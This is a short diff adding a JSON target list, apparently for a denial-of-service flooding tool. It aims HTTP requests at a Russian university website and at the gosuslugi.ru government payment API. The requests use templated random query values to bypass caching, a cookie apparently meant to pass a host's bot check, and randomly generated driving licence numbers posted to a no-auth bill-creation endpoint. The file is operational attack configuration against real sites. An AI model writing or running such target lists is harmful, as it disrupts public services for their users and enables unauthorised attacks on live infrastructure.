@@ -1,0 +1,22 @@
+{
+  "targets": [
+    {
+      "method": "HTTP",
+      "target": "https://www.chsu.ru/",
+      "options": {
+        "verb": "GET",
+        "path_qs": "/?search={{ str(int(5, 10)) }}",
+        "headers": {"Cookie": "beget=begetok"}
+      }
+    },
+     {
+      "method": "HTTP",
+      "target": "https://www.gosuslugi.ru/api/pay/public/v1/paygate/bill/create?interfaceTypeCode=BETA_NOAUTH",
+      "options": {
+        "verb": "POST",
+        "body": "{\"documents\": [{ \"docType\": \"RF_DRIVING_LICENSE\", \"docNumber\": \"{{int(1000, 9999)}} {{int(100000, 999999)}}\" }]}",
+        "headers": {"Content-Type": "application/json", "Referer": "https://www.gosuslugi.ru/pay?tab=fine"}
+      }
+    }
+  ]
+}
